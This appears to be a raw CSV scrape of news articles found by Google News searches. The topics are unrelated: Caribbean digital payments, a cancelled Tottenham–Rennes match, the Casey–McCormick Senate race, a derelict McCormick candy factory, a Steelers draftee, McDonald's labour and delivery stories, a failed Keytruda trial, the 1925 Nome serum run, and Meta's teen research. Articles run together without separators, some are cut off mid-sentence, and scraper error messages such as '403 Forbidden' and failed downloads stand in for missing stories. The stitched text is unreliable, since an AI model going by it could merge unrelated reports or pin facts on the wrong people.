The other prepaid card solutions in the markets are attached to banks and affiliated with Mastercard International. Sagicor Bank Jamaica Limited (SBJ) issues the My Cash Jamaica card while NCB launched its own solution in April. GraceKennedy Limited intends to launch a digital wallet with a prepaid card backed by First Global Bank Limited in short order. Another commercial bank is planning to launch a new payment services provider in the financial year. SBJ is planning to switch its debit card to an international payment processor in short order while the Victoria Mutual Building Society expects to offer Visa branded debit and credit cards as well.

Alternative Payment Providers

The AFSL event highlighted the need for more options to progress society to a greater digital modality as the formal banking system remains a massive barrier for many to transition towards. In the USA other payment options like Cash App Apple Pay Google Wallet and so on exist in the market space to cater to a wide cross section of citizens.

In Jamaica the BOJ has piloted Central Bank Digital Currency (CBDC) with NCB to improve financial inclusion and the modality of money. Though this is still in the testing phase it is unknown how the market will respond to the offering. Most Jamaicans still prefer the use of cash for a variety of reasons.

WiPay founder and CEO Aldwyn Wayne is looking to change that perception within Jamaica and the Caribbean. WiPay recently relocated its headquarters from Trinidad and Tobago to Grenada Crescent. WiPay is a registered payment services provider in the twin island republic and other Caribbean jurisdictions.

When asked about the company’s WiCard and other offerings to the market Wayne responded “We issue our own cards through our platform in other countries where we already got the regulatory approval. We can issue our own cards because we’re a Mastercard partner. You don’t even need a physical card and can get a card on your phone now.”

Wayne explained that there are alternative solutions that can provide similar value like digital QR codes in a closed loop manner. Through this QR code option it launched a digital grant initiative in partnership with Member of Parliament Floyd Green in October to benefit 100 front-line workers at the Black River Hospital. The recipients received a QR code via text WhatsApp or e-mail and were able to spend it at participating redemption centres in St Elizabeth.

Spurs' final group-stage tie was postponed due to a Covid-19 outbreak at the club with Antonio Conte's side asking for it to be rescheduled but with a race against time to play it before the December 31 deadline UEFA have stated it is not possible.

The European governing body have referred the matter to the Control Ethics and Disciplinary Body to resolve the issue with Tottenham forfeiting the game a potential option.

UEFA have ruled Tottenham's Europa Conference League game vs Rennes cannot be played

Antonio Conte's (above) Spurs had faced the tricky task of rescheduling the fixture before the December 31 deadline UEFA has set - but it now appears the match cannot happen

The UEFA statement said: 'Following a Covid-19 outbreak in the team of Tottenham Hotspur FC ahead of the UEFA Europa Conference League group stage match against Stade Rennais FC scheduled to take place on 9 December 2021 in London the match could not take place.

'Unfortunately despite all efforts a solution that could work for both clubs could not be found.

'As a consequence the match can no longer be played and the matter will therefore be referred to the UEFA Control Ethics and Disciplinary Body for a decision to be taken in accordance with Annex J of the above-mentioned competition regulations.'

Tottenham announced on Wednesday the game would not happen the following day because of the coronavirus outbreak but opponents Rennes angrily accused the Premier League side of making a 'unilateral decision'.

They accused Spurs of causing 'London fog' by refusing to tell them how many cases they had and informing them in the afternoon the game would be played only to call it off an hour after they had arrived in the capital.

French side Rennes called for the Europa Conference League game with Spurs to be cancelled

The Ligue 1 side are set to start to be on their winter break from December 22 to January 8

Rennes responded to Tottenham's statement with their own claiming Spurs refused to reveal the number of players affected by Covid-19 when competition rules state a match must be played as long as the team has 13 outfield players and a goalkeeper.

Spurs were understood to have just about enough players available without the suspended Ryan Sessegnon plus their injured and Covid-affected players to meet that threshold.

The Ligue 1 club who returned to France on Thursday morning later said they 'hope the interests of the club will be respected' regarding a possible rearrangement.

UEFA's ruling comes with serious questions over when the game would be played given that rules state there is a December 31 deadline for group games to be completed and an extension of that deadline into January is apparently not possible.

Tottenham have a packed domestic schedule with their game against Burnley already postponed and Rennes go on a winter break on December 22 with no intention of playing after that point.

There are fears Tottenham's next couple of games could be affected by the Covid outbreak

The first-team area of Spurs’ training ground is closed and the players are training from home

The club's league match against Brighton on Sunday has also been postponed with the clash against Leicester the week after also at risk of being delayed.

Conte’s men still have to face Leicester Liverpool Crystal Palace and Southampton in the Premier League this month plus West Ham in the Carabao Cup on December 22.

The prospect of moving the game against the Hammers appears small given semi-final first legs are scheduled to take place on January 4 and 5.

UEFA had asked Tottenham to suspend a Premier League game - but it remains unclear if either the club or the league would allow such a measure.

Tottenham whose first-team area at the training ground is closed with players working from home hope team training can recommence in the next 48 hours depending on the next round of Covid tests.",https://news.google.com/articles/CBMiR2h0dHBzOi8vd3d3Lm1ha2V1c2VvZi5jb20vcGxhY2VzLXRvLWZpbmQtY28tZm91bmRlci1mb3Itc3RhcnR1cC1vbmxpbmUv0gEA?hl=en-US&gl=US&ceid=US%3Aen,7 Places to Find a Co-Founder for Your Startup Online,"ERROR: Article `download()` failed with ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response')) on URL https://news.google.com/articles/CBMiR2h0dHBzOi8vd3d3Lm1ha2V1c2VvZi5jb20vcGxhY2VzLXRvLWZpbmQtY28tZm91bmRlci1mb3Itc3RhcnR1cC1vbmxpbmUv0gEA?hl=en-US&gl=US&ceid=US%3Aen"

Bob Casey goes after Dave McCormick on Connecticut residency,"PITTSBURGH (KDKA) — The race between Sen. Bob Casey and his Republican challenger former hedge fund CEO Dave McCormick is expected to be one of the most hotly contested elections in the nation.

Casey's name is synonymous with Pennsylvania especially Scranton. But it didn't take Casey long to label McCormick a Connecticut Yankee for living outside the state for many years.

""He hasn't told the truth about where he lives"" Casey said. ""He lives in Connecticut. He hasn't been truthful about that. So you have an out-of-state candidate who's being supported by out-of-state billionaires.""

KDKA-TV's Jon Delano: ""Where do you live?""

McCormick: ""I live in Pennsylvania. I live in Pittsburgh.""

Just before his run for U.S. Senate in 2022 McCormick who is divorced and remarried sold his home in Connecticut bought a home in Pittsburgh's Squirrel Hill and rented another home in Connecticut.

""My youngest daughter lives with her mother in Connecticut so I periodically go back to Connecticut to see my daughter. Being a good dad is even more important than being a good senator"" McCormick said.

McCormick grew up in Bloomsburg where his father was president of Bloomsburg University. But he also lived outside the state working first for the Bush administration and then as president and CEO of Bridgewater Associates a Connecticut-based multi-billion dollar hedge fund from 2009 to 2022.

McCormick sees the Connecticut residency issue as a distraction from Casey's record.

""When you have the results that Bob Casey has with inflation border crime the war on oil and gas the world falling apart what do you do? Well you try to make it about something that is unrelated in your opponent"" McCormick said.

But Casey says McCormick's long out-of-state residency coupled with his work for a hedge fund associated with multi-millionaires demonstrates who he will represent in the Senate.

""He hadn't voted in Pennsylvania in about 16 years. So I think that's going to be an issue. But I think ultimately it's going to be about whose side you are on"" Casey said.

Casey sees himself as representing hard-working middle-class Pennsylvanians while McCormick argues that Casey has failed to deliver any results.

McCormick criticizes Casey for supporting President Biden's infrastructure bill CHIPS and Science Act the Inflation Reduction Act and other bills.

""Bob Casey has been a 98% vote for Joe Biden"" McCormick said.

Casey sees himself as a soft-spoken doer who gets things done for this part of Pennsylvania.

""The bridge investment alone is about a quarter of a billion dollars just for bridges"" Casey said. ""But there's investments for K-12 education investments for communities all across the board whether it was in the infrastructure bill the American Rescue legislation or otherwise. So we've been able to get resources to communities to try to lift them up but we still have work to do so I want to keep delivering.""

The two candidates disagree on other issues as well like abortion. Casey who is personally pro-life supports the Women's Health Protection Act to codify abortion rights nationwide while McCormick opposes abortion with limited exceptions and opposes all federal legislation on the subject.

""Our states should decide"" McCormick said. ""Pennsylvania should decide as it has. My belief is that we shouldn't have bans. We shouldn't have national legislation.""

Casey says McCormick's work at the hedge fund to promote China will be another issue.

""When China cheats Pennsylvania loses jobs. So he's helped to fuel that rise of China and I think that's going to be a major issue in the campaign"" Casey said.

Delano: ""So you're suggesting he's soft on China?""

Casey: ""I don't think there's any question about it compared to what I've been doing.""

""I've been in business"" McCormick said. ""Yes my business did 2% of its business in China. I know what it's like to negotiate against the Chinese in the government and in business. There is no one better equipped to deal with the challenge of China than me.""

These are just a few of many issues on which Casey and McCormick disagree. Given the millions both campaigns will spend expect to hear a lot more in the months ahead.",https://news.google.com/articles/CBMiS2h0dHBzOi8vd3d3LmF4aW9zLmNvbS8yMDI0LzA1LzA4L21jY29ybWljay1wYWMtYWQtcGVubnN5bHZhbmlhLXNlbmF0ZS1jYXNledIBAA?hl=en-US&gl=US&ceid=US%3Aen,Scoop: McCormick PAC launches big ad buy in Pennsylvania Senate race,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.axios.com/2024/05/08/mccormick-pac-ad-pennsylvania-senate-casey on URL https://news.google.com/articles/CBMiS2h0dHBzOi8vd3d3LmF4aW9zLmNvbS8yMDI0LzA1LzA4L21jY29ybWljay1wYWMtYWQtcGVubnN5bHZhbmlhLXNlbmF0ZS1jYXNledIBAA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMifmh0dHBzOi8vd3d3LmNiYy5jYS9uZXdzL2NhbmFkYS9sb25kb24vc29tZWJvZHktd2lsbC1kaWUtaWYtZm9ybWVyLW1jY29ybWljay1zLWZhY3RvcnktaXNuLXQtdG9ybi1kb3duLW5laWdoYm91cnMtc2F5LTEuNzE5OTI4OdIBIGh0dHBzOi8vd3d3LmNiYy5jYS9hbXAvMS43MTk5Mjg5?hl=en-US&gl=US&ceid=US%3Aen,'Somebody will die' if former McCormick's factory isn't torn down neighbours say,"The owners of the former McCormick's candy factory on Dundas Street have been ordered by city bylaw officials to restore security fencing around the crumbling building but business owners near the property say much more needs to be done to deal with what they call a dangerous eyesore.

""The fence usually lasts 48 hours"" said Gord Inglis who operates Inglis Cycle located on McCormick Boulevard behind the property. ""It's very run down neglected not looked after and ignored and it's turned into a playground for children and an area where homeless people [go] in and out.""

A work order was posted on three parts of the fence surrounding some of the property stating that a property inspection done May 8 found contraventions of a city bylaw that requires owners to ensure that vacant buildings are secured against unauthorized entry and to protect the building from the risk of ""fire accident or other danger.""

When a CBC News reporter visited the site on Thursday there were at least eight places where the fence had been torn down partially or completely allowing anyone to walk onto the property.

Windows doors and duct openings were recently covered with plywood Inglis said but that's also usually torn down within days.

Two young teens had to be rescued from the roof of the building on Sunday night London Fire said. There was a fire in the building and the teens who were exploring inside made their way to the roof while they waited for help said Platoon Chief Kirk Loveland. An aerial ladder was used to communicate with the youth and tell them to stay put until firefighters came to the roof to escort them out of the building he said. The teens weren't hurt and were taken away by police.

A similar incident happened on Thursday afternoon. A teen was stuck in the building and police requested the aerial truck again so they could communicate with the young person and escort them out of the building.

Seeing young people in the building is a frequent occurrence Inglis said. ""I feel the city is playing with the devil. Every time an emergency service is called to the building it seems to be more severe. If you don't do something with this building somebody is going to get hurt.""

'We're picking up garbage everyday'

The recent rescue was just one of the latest incidents where emergency crews were called to the building said Lou Fatibene who owns neighbouring Dundas Automotive.

""I'm surprised nobody's been killed over there yet"" Fatibene said. ""We've had cars broken into the whole area has been vandalized. We're picking up garbage every day.""

Somebody's going to die"" he said. ""How much did it cost us taxpayers to have that aerial truck out there to save the kids?""

Tena Smith who works at Tim's Tires across the street from the old factory says young people are using it as an urban exploration site. Some throw bricks and other items from the roof damaging property and cars below.

""Every Monday when we come in after the weekend it's like the teenagers have had a heyday in there and they've knocked out more windows"" she said. ""We used to park our cars over there to make room for our customers but they throw stuff off the roof. A brick landed on my car and dented my roof so we don't park over there anymore.""

The owners of the property Sierra Construction based in Woodstock did not reply to emails and phone calls asking for comment. They have until May 12 to comply with the city's work order.

The company bought the property for $1. In 2021 McCormick Villages Inc. owned and run by Sierra Construction submitted a plan for a subdivision for the factory site comprising of five hectares. In October 2022 city council approved the development which included repurposing the former factory into a mixed-use mid-rise building as well as townhouses a long-term care facility and a seniors apartment building on the property.

But Sierra Construction wasn't happy with council's decision to limit the apartment building height to five-storeys and to make a multi-use path on the property publicly-accessible among other issues. The Ontario Land Tribunal will consider that appeal in June.

It's been frustrating watching the building and property fall further and further into disrepair said Ward 4 Coun. Susan Stevenson. ""It's becoming a huge safety concern and a lot of people are worried that there will be a tragedy there let alone the disturbance to the neighbourhood that's happening as well"" she said.

Wearing No. 66 David DeCastro’s and Alan Faneca’s old numbers McCormick told reporters he’s fully aware of the legacy he’s replacing. At least in number.

“I have heard a little bit about it” he told reporters via Steelers.com when asked about his jersey digits. “I heard I got some big shoes to fill. And that’s super exciting.”

McCormick clearly isn’t backing away from the expectations. More similar to Troy Fautanu DeCastro was the team’s first-round pick in 2012 going lower in the draft than projections and the last West Coast college prospect the team had taken in the first round prior to Fautanu. After battling injury as a rookie DeCastro turned into one of the NFL’s best guards a six-time Pro Bowler and two-time All-Pro before ankle problems shortened his career. Faneca came before both of them a first round pick and Hall of Famer even if his call to Canton took longer than it should’ve.

A punishing run blocker with tons of experience McCormick didn’t get his phone call until early on Day 3 the team’s fourth round pick. While McCormick will keep his goals high expectations out of the gate are lower than they were for DeCastro. Pittsburgh’s starting guards of James Daniels and Isaac Seumalo are set in stone entering the spring meaning McCormick is set to begin the year as a backup.

But o-line depth is valuable and can be quickly tested. Pittsburgh has been incredibly fortunate to avoid serious or multiple offensive line injuries the past two seasons but sheer law of averages suggests that luck will run out. That could push McCormick into a role sooner than expected.

“I’m ready to do whatever it takes to get on the field” he said. “I’ll play either guard spot center whatever it takes. I just want to help this organization in any way I can.”

That could include reps at center. McCormick noted he was the backup center in college and had South Dakota State’s starter gotten hurt he would’ve shifted over. Pittsburgh worked him out as such shortly before the draft and though Zach Frazier’s selection makes him a clear favorite to start the Steelers like to make their backups as versatile as possible. Friday McCormick played right guard and the Steelers will likely have him work at guard this spring before considering center come training camp."

Screenshot by ZDNet

As the pandemic has worn on and worn humans out one or two companies have prospered.

Fast food conglomerates for example managed to stay open and do business while so many traditional restaurants had to shut down.

Moreover the fast-food companies benefited from the glory of apps to deliver food to people's doors enhancing modern Americans' twin penchants for abject lassitude and instant gratification.

One beneficiary of all this of course was the cabal of tech-driven delivery companies that gouged restaurants so shamelessly so much so that certain cities chose to put a limit on their commissions.

Meanwhile the fast-food people struggled to hire sufficient staff to cope with the increasing numbers arriving at their restaurants. Many dining rooms remained closed even when the COVID-19 restrictions were lifted.

And then someone at McDonald's began to realize that the company was so big and powerful that it could wrest back some dominance from the likes of DoorDash and Uber Eats.

So it was that in a little-reported announcement McDonald's declared it had arranged for ""new deals"" with both those delivery companies.

One can't conceive that these new deals were more advantageous for anyone but McDonald's.

Indeed as Restaurant Business has it McDonald's proudly sniffed that its franchisees should see greater profits and healthier cash flow as a result of McDonald's perfectly understandable muscling.

Because you still believe in humanity you might think that McDonald's and its operators should invest some of those profits into hiring more people thereby improving the customer's lot.

You might also think sofas should be made of raspberry jelly.

Yes it's conceivable that offering even better pay and conditions to potential recruits might attract them to the McDonald's fold and improve its customer service.

However many will fear that the vast majority of these increased profits will line the coffers of the operators.

Delivery is becoming an ever-increasing element of McDonald's revenue. The company believes it's uniquely positioned to deliver on delivery because it has so many darned restaurants. Ergo it's easier to get warm(ish) food to grateful customers. The food doesn't have to travel so far.

Somehow though McDonald's was in certain cases paying 15% to delivery companies. Which seems quite an enormous percentage in a relatively low-margin operation.

Then again if the delivery companies will now be making less money where are they going to themselves find staff and pay them anything resembling an attractive wage?

At a time of the so-called Great Resignation where many employees refuse to be tempted by low pay and poor conditions what can McDonald's -- or DoorDash and Uber Eats -- offer anyone who might be interested? (Well Door Dash just started hiring drivers who are full-time employees).

It's one thing to attract customers with successful campaigns featuring Mariah Carey Travis Scott Saweetie and J Balvin. It's another to ensure there's an infrastructure in place to support the increased business such campaigns may generate.

But if you're a company already investing heavily in technology -- robot ordering at the drive-thru for example -- perhaps your dream is to make the restaurant's ghost kitchens and the business merely one run on vending machine principles.

The world has changed considerably in the last two years.

Burger King

Quick service restaurants have adopted a uniform design of minimalism and clean lines.

Experts say that this design is most efficient for handling mobile and drive-thru orders.

Fast-food and fast-casual chains look more alike and they're competing for the same customers.

Next time you eat a burger a burrito bowl or a pumpkin spice latte you might be picking it up in an airy cube-shaped restaurant.

McDonald's Burger King and other chains across the fast-food and fast-casual industries have released designs and started updating locations to what many of them have dubbed the restaurant of the future. Most of these designs look strikingly similar even for establishments that serve different products.

""We're seeing squares and rectangles cube shapes with a lot of glass and a very airy look to them. They have clean lines very contemporary looking"" Tom Cook principal at King Casey restaurant consulting agency told Insider about the restaurant designs.

The restaurants also tend to be ""quite minimalistic"" with wood tones and natural colors while integrating technology restaurant consultant Mark Moeller told Insider.

These designs mostly exist out of efficiency experts told Insider. As to go orders through mobile orders drive-thru or meal delivery apps like DoorDash become more important to companies' bottom lines restaurants are increasingly designed to accommodate them. A simple minimalistic cube is the most adaptable design and can accommodate add-ons like drive-thrus or mobile pickup areas Garret Rice senior designer at FRCH Design Worldwide told Insider.

With more ways to order and get food ease of access is key. That efficiency is a consideration in every part of the design even the initial construction Moeller said. Past iterations of iconic fast food architecture tended towards designs with corners and curves requiring more skilled labor to build. The new minimal restaurants with straight lines are much easier and faster to build reducing initial costs and increasing revenue Moeller said.

Another factor in these different types of restaurants looking similar from Chipotle to KFC to Starbucks is that they're now going after the same customers more than ever according to Moeller. Fast-food chains are competing against each other but also fast-casual chains and as a result taking their overall branding more seriously.

Fast food used to be about creating cheap food fast or aimed at children Moeller said but now these chains are dropping ""kitschy"" design and distinctive ""gimmicky"" architectural features to create a broader appeal.

Chipotlane drive-thru design. Chipotle

The distinction between fast-food chains like McDonald's and fast-casual chains like Chipotle has eroded to the point where these categories are nearly meaningless Rice said. Both types of chains are trying to communicate that they're focused on food not design so restaurants are minimal he said. Chains ""need to save money on design to spend more on food"" as Moeller put it.

While fast-food and fast-casual sales continue to grow impressive architecture or distinctive designs won't help a brand stand out in the crowded landscape. Multiple ways of accessing food through drive-thrus mobile pickup stations and curbside spots will be key. The minimal cube design just happens to be an efficient way to get there.

Under the latest promotional efforts posted on the company’s official Weibo account complaints from overworked frontline employees flooded the comments section most of which are aimed at underpayment and overwork during frequent special offer campaigns.

“Can McDonald’s please think about its employees when planning these promotions? The employees are humans too not your slaves! Do you pay us for the overtime? We are the ones doing all the work and receiving all the blame. Why don’t you come and try for yourselves? F[uc]k” reads one of the top comments.

Branded as “End of year celebration” McDonald’s latest deal will last 21 days throughout this December which is putting enormous pressure on workers. Pandaily learned from a former employee who chose to remain anonymous that in an average McDonald’s restaurant in Guangzhou workers (including their managers) have to work at least 8.5 hours a day during promotional days sometimes even 12 hours straight.

McDonald’s regulations have an 11-hour working time limit but during busy hours it is not uncommon to clock out but continue working for another few hours. “I once worked from 8 in the morning to 1 a.m. Another time I worked from 6 a.m. to 11 p.m. then back to work 6 a.m the next day” said the former employee. Another employee complained in the comments section that he should have eight days off a month but so far he hadn’t taken those days off for several months.

It is usual for a McDonald’s worker to perform multiple tasks at the same time including ordering cooking packing and often times making apologies to impatient customers. Adding on dine-in orders each restaurant also has to take orders from several online platforms. On special offer days the managers will have to join their staff to help with the overload of orders generated by promotions. “Managers are the most miserable. The title sounds good but they are burdened with the pressure to achieve all kinds of goals set by the company while having to do the work of ordinary staff” the former employee said to Pandaily. A comment from @Totac said that in the restaurant she worked in there were only two workers in the kitchen who had to make 800 burgers on a promotion day. “Even our full-time employees are leaving. Soon McDonald’s executives will have to make burgers themselves.”

Apart from the demanding workload low wages are another reason for the lack of human resources. In the case of Guangzhou the hourly rate is 14.3 yuan – two thirds of the price of a Big Mac and just about the same as the local minimum standard for full-time employment. On paper workers cannot work over 200 hours a month which gives them approximately 2800 yuan per month in the case of Guangzhou less than one third of the city’s average monthly salary in 2020. But in reality overtime is commonplace and many do not receive overtime pay. Other comments indicate 2000-3000 yuan per month is the average one could earn by working in a McDonald’s restaurant.

(Overworked frontline employees flooded McDonald’s Weibo account.)

Many also mentioned CITIC Group one of China’s largets state-owned investment groups and the operator of the McDonald’s business in China. In 2017 McDonald’s sold its mainland China and Hong Kong operations to CITIC and Carlyle granting them frachise rights for 20 years with CITIC controlling 52% of McDonald’s stake. The sale raised concerns from an American labor organization the Service Employees International Union who maintained that “Experience in other markets such as Brazil and Puerto Rico has shown the McDonald’s master franchisee model being adopted in Greater China is not in the interests of workers as it makes it harder for franchisees to provide adequate pay and conditions.” The Hong Kong Federation of Trade Unions (HKCTU) also warned about the intense pressure the sale will inflict upon franchises and individual workers.

Their warnings seemed to have come true. The former employee Pandaily interviewed said there weren’t so many promotions back in late 2016 when she started working there. But since CITIC took over McDonald’s China has been aggressively launching promotions. “At first there was only the Member’s Month in August then it became every Monday then every Monday and Thursday then every Monday Thursday and the weekends. There was an entire month of ‘breakfast month’ promotions last June… now we have another entire month to work with.” She also commented that McDonald’s employees had always been paid low but the workload was much less in the old days.

Yet the story of the evil capitalist exploiting workers hasn’t seemed to have caught the attention of higher ups – neither from McDonald’s or the country’s labor market regulators – the topic didn’t even make it to Weibo’s “hot topic search chart”. The former employee Pandaily contacted said she had no hope at all that their calls on social media would make any difference. “McDonald’s is too big”.

On Decmber 3 the burger giant decided to reward its overworked workers each with a McDonald’s Smiling T-shirt and a free meal for two. “Let’s step into an exciting year of 2022 together” wrote McDonald’s China COO Eva Lin towards the end of the announcement."

Adjuvant treatment with Keytruda and chemotherapy—with or without radiotherapy—failed to hit the mark for disease-free survival (DFS) in newly diagnosed high-risk endometrial cancer patients who received surgery with curative intent according to an interim analysis of Merck’s late-stage KEYNOTE-B21 study. DFS refers to the length of time after a primary treatment ends that a patient survives without any signs or symptoms of their cancer.

The trial’s other primary endpoint overall survival was not formally tested because the Keytruda-chemo combo failed to reach statistical significance on the DFS metric Merck said in a Thursday release.

Merck says it’s continuing a full evaluation of the data and is working with investigators to share the results at a later date.

Endometrial cancer is the sixth most common cancer in women and the most common type of cancer in the uterus according to Merck. In the U.S. alone the company estimates roughly 67880 patients will be diagnosed with uterine body cancer this year. Merck also estimates there will be 13250 patient deaths from the disease in 2024.

“While these results were not what we had hoped we are focused on continuing to build on the established role of Keytruda in advanced endometrial carcinoma through our approved indications” Gursel Aktan M.D. Ph.D. vice president of global clinical development at Merck Research Laboratories said in a statement.

Merck will continue to test Keytruda-based combinations—plus other treatment approaches like antibody-drug conjugates (ADC)—in endometrial and other types of gynecologic cancers Aktan said.

Keytruda is already approved in patients with endometrial carcinoma that is microsatellite instability-high (MSI-H) or mismatch repair deficient (dMMR). The PD-1 inhibitor picked up that nod in 2022 following a 2017 approval that allowed the drug to cover previously treated MSI-H/dMMR tumors in patients without alternative treatment options.

Keytruda also boasts a second indication alongside Eisai-partnered Lenvima in previously treated endometrial cancer that’s not dMMR.

Over the past year Merck’s Keytruda has been sparring with GSK’s PD-1 rival Jemperli over endometrial cancer dominance in the clinic.

Last February just two months after Jemperli snagged a historic win for immunotherapy in first-line endometrial cancer Keytruda plus standard chemotherapy beat chemotherapy alone at staving off tumor progression or death in advanced or recurrent disease.

The following month at the Society of Gynecologic Oncology 2023 annual meeting both GSK and Merck provided a closer look at their meds’ late-stage performance in first-line endometrial cancer with Keytruda appearing to edge out Jemperli in MMR proficient (pMMR) patients—a key subgroup that Merck says comprises roughly two-thirds of all endometrial cancer cases.

GSK ultimately beat Merck to the finish line for a PD-1 nod in newly diagnosed disease with the company’s Jemperli in July snagging FDA clearance as an add-on to chemotherapy for patients with primary advanced or recurrent endometrial cancer but only for tumors that are mismatch repair deficient (dMMR) or microsatellite instability-high (MSI-H).

Meanwhile Merck and Eisai’s Keytruda-Lenvima combo in December missed the mark in a phase 3 study as a potential first-line treatment in certain patients with advanced or recurrent endometrial carcinoma. The oncology cocktail failed to demonstrate an improvement in overall survival and progression-free survival over a regimen of platinum-based chemotherapy missing both of its primary endpoints.

While Keytruda climbed to the top of pharma's sales charts in 2023 the drug has experienced a series of clinical ups and downs in 2024.

The PD-1 inhibitor started out the year by delivering a partial win in a phase 3 study pitting the drug against high-risk localized muscle-invasive bladder cancer and locally advanced bladder cancer. Around the same time Keytruda bolstered its case as a postsurgical treatment for resectable kidney cancer with data showing it helped slash the risk of death by 38% versus placebo post-kidney removal in patients with clear cell renal carcinoma—the most common form of kidney cancer.

The drug also posted a win in cervical cancer in March. But that same month Keytruda in combination with Lynparza failed to improve patients’ life expectancy or delay progression or death when subbed in for the chemotherapy pemetrexed during maintenance treatment of newly diagnosed metastatic nonsquamous non-small cell lunger cancer.",https://news.google.com/articles/CBMif2h0dHBzOi8vaGVhbHRoLmVjb25vbWljdGltZXMuaW5kaWF0aW1lcy5jb20vbmV3cy9waGFybWEvcGhhcm1hLWluZHVzdHJ5L21lcmNrcy1lbmRvbWV0cmlhbC1jYW5jZXItdGhlcmFweS1mYWlscy10cmlhbC8xMDk5ODI0OTbSAYMBaHR0cHM6Ly9oZWFsdGguZWNvbm9taWN0aW1lcy5pbmRpYXRpbWVzLmNvbS9hbXAvbmV3cy9waGFybWEvcGhhcm1hLWluZHVzdHJ5L21lcmNrcy1lbmRvbWV0cmlhbC1jYW5jZXItdGhlcmFweS1mYWlscy10cmlhbC8xMDk5ODI0OTY?hl=en-US&gl=US&ceid=US%3Aen,Merck's endometrial cancer therapy fails trial,"Join the community of 2M+ industry professionals Subscribe to our newsletter to get latest insights & analysis.

“An epidemic of diphtheria is almost inevitable here. Stop. I am in urgent need of one million units of diphtheria antitoxin. Stop. Mail is only form of transportation. Stop.”

Dr. Curtis Welch

This was the desperate radio telegram in January 1925 from Dr. Curtis Welch in Nome Alaska to all the major Alaska towns to territorial governor Scott Bone in Juneau and to the U.S. Public Health Service in Washington D.C. Diphtheria was spreading through the icebound community. Children had already died and the local supply of diphtheria antitoxin had expired the previous summer.

Known as the “Great Race of Mercy” it’s an iconic story of human compassion.

Weather prevented delivery by air so relay teams of sled dogs and their mushers raced against the clock to deliver 300000 units of antitoxin which was produced by Merck legacy company H.K. Mulford. They completed the 674-mile journey over what later became known as the Iditarod Trail in a record-breaking five days and seven hours despite whiteout conditions and temperatures of 50 degrees below zero.

Over 130 years of vaccine leadership In 1895 the H.K.

Xinhua News Agency/Getty Images

Leaked Meta research on teen mental health isn't the smoking gun we think it is Andrew Przybylski said.

The scientist told Insider it could not be held up as ""damning proof"" of the ill effects of Instagram.

He's among more than 300 scientists who have called on Mark Zuckerberg to open up Meta's mental health research.

When Facebook whistleblower Frances Haugen leaked internal Instagram research about the effect of the platform on teen mental health lawmakers seized on what appeared to be a damning statistic: ""Thirty-two percent of teen girls said that when they felt bad about their bodies Instagram made them feel worse.""

But Professor Andrew Przybylski director of research at the Oxford Internet Institute believes the research isn't the smoking gun politicians believe it to be.

In an interview with Insider Przybylski an experimental psychologist who specialises in social media said the leaked research amounted to little more than extremely preliminary work and was a long way from the definitive proof that Instagram is bad for teenage girls. ""If you were responsible and you ran a giant social media platform this is like scoping research. This is the beginning of research"" he said.

""A lot of this work wouldn't pass muster as a bachelor's thesis"" he said. To have the research held up as ""damning proof"" of the ill effects of Instagram is ""madness-making if you're a responsible scientist"" he added.

Przybylski said Meta's research was based entirely on self-reporting by Instagram users meaning there wasn't enough to draw conclusions about the actual effects of social media on mental health.

He drew a parallel with smoking. ""You don't use people's opinions about whether or not smoking is good for them to draw some health inference"" he said.

However Przybylski said he's not ruling out the possibility that Instagram and other social media platforms have an adverse effect on the mental wellbeing of teens and children.

""This is about inviting Facebook to lead the way to be a partner in a maturing science"" he said. ""And that doesn't mean locking everything away in proprietary computing environments.""

Przybylski is a co-author of an open letter to Mark Zuckerberg that calls on the Meta CEO to open his company's doors to scientists to allow them to scrutinize its mental health research. The letter has more than 300 signatories.

The open letter to Zuckerberg voiced the concern that Meta's in-house research might be dangerously inadequate to deal with issues as serious as child and teen mental health. ""We do not believe that the methodologies seen so far meet the high scientific standards required to responsibly investigate the mental health of children and adolescents"" the letter says.

This week Instagram CEO Adam Mosseri appeared before Congress to testify about child safety on the platform.

When asked at a Senate hearing Wednesday about opening up Meta's data to scientists Mosseri said researchers should have ""regular access to meaningful data about social-media usage across the entire industry"" but stopped short of promising full transparency citing privacy concerns The Wall Street Journal reported.







In response to the open letter a Meta spokesperson said: ""This is an industry-wide challenge. A survey from just last month suggested that more US teens are using TikTok and YouTube than Instagram or Facebook which is why we need an industry-wide effort to understand the role of social media in young people's lives.""",https://news.google.com/articles/CBMidGh0dHBzOi8vdmVudHVyZWJlYXQuY29tL2RhdGFkZWNpc2lvbm1ha2Vycy9hcy1tZXRhLXB1c2hlcy1mb3ItdGhlLW1ldGF2ZXJzZS1pdC1tYXktYmUtYS1iZXR0ZXItZml0LWZvci1zb21lLW5vdC1hbGwv0gEA?hl=en-US&gl=US&ceid=US%3Aen,As Meta pushes for the metaverse it may be a better fit for some not all,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://venturebeat.com/datadecisionmakers/as-meta-pushes-for-the-metaverse-it-may-be-a-better-fit-for-some-not-all/ on URL https://news.google.com/articles/CBMidGh0dHBzOi8vdmVudHVyZWJlYXQuY29tL2RhdGFkZWNpc2lvbm1ha2Vycy9hcy1tZXRhLXB1c2hlcy1mb3ItdGhlLW1ldGF2ZXJzZS1pdC1tYXktYmUtYS1iZXR0ZXItZml0LWZvci1zb21lLW5vdC1hbGwv0gEA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMihwFodHRwczovL2luZGlhbmV4cHJlc3MuY29tL2FydGljbGUvdGVjaG5vbG9neS90ZWNoLW5ld3MtdGVjaG5vbG9neS9tZXRhLWFubm91bmNlcy1hLWxpdmUtY2hhdC1mZWF0dXJlLWZvci1mYWNlYm9vay11c2VyLXN1cHBvcnQtNzY2ODU3MC_SAYwBaHR0cHM6Ly9pbmRpYW5leHByZXNzLmNvbS9hcnRpY2xlL3RlY2hub2xvZ3kvdGVjaC1uZXdzLXRlY2hub2xvZ3kvbWV0YS1hbm5vdW5jZXMtYS1saXZlLWNoYXQtZmVhdHVyZS1mb3ItZmFjZWJvb2stdXNlci1zdXBwb3J0LTc2Njg1NzAvbGl0ZS8?hl=en-US&gl=US&ceid=US%3Aen,Meta announces a Live Chat feature for Facebook user support,"Social media giant Meta has announced a live chat feature for users that are locked out of their Facebook accounts.

